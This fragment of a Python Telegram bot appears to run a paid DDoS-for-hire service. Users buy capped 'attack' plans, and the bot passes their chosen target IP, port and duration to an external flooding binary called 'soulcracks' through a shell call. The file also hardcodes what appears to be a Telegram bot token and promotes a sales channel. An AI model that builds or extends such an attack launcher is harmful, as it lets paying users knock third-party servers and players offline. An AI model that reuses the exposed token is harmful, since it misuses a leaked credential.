...
TOKEN = '7458303581:AAEN1B52WNCHdSq2wGF0FMYXJK5ZSs2KHJw'
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./soulcracks {target_ip} {target_port} {duration} 200")
    ...
    if action == '/approve':
        if plan == 1:  # Instant Plan ✅
            ...
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*Approval failed: Instant++ Plan ☠️ limit reached (499 users).*", parse_mode='Markdown')
                return
...
def attack_command(message):
    ...
    try:
        ...
        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "*Your Instant Plan ☠️ is currently not available due to limit reached.*", parse_mode='Markdown')
            return
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/BGMI_ID_SALE_216*", parse_mode='Markdown')
